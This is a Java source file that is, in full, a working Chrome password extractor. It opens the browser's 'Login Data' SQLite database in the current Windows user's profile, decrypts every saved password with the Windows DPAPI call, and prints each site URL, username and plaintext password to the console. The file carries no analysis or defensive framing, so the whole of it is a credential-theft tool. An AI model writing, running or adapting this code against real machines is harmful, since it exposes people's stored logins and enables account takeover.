package com.simon987;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import com.sun.jna.platform.win32.Crypt32Util;


public class Main
{
    public static void main(String[] args) throws ClassNotFoundException
    {
        Class.forName("org.sqlite.JDBC");

        Connection connection = null;
        try{
            connection = DriverManager.getConnection("jdbc:sqlite:C://Users//" + System.getProperty("user.name") + "//AppData//Local//Google//Chrome//User Data//Default//Login Data");
            Statement statement = connection.createStatement();
            statement.setQueryTimeout(5);

            ResultSet rs = statement.executeQuery("select origin_url,username_value,password_value from logins");
            int id = 0;
            while(rs.next()){
                String url =  rs.getString("origin_url");
                String password = new String(Crypt32Util.cryptUnprotectData(rs.getBytes("password_value")));
                String username = rs.getString("username_value");
                ++id;

                System.out.println("[" + id + "]" + url + " : " + username + " : " + password);
            }
        }catch(SQLException e)       {
            System.err.println(e.getMessage());
        }finally{
            try{
                if(connection != null){
                    connection.close();
                }
            }catch(SQLException e){
                System.err.println(e);
            }
        }
    }
}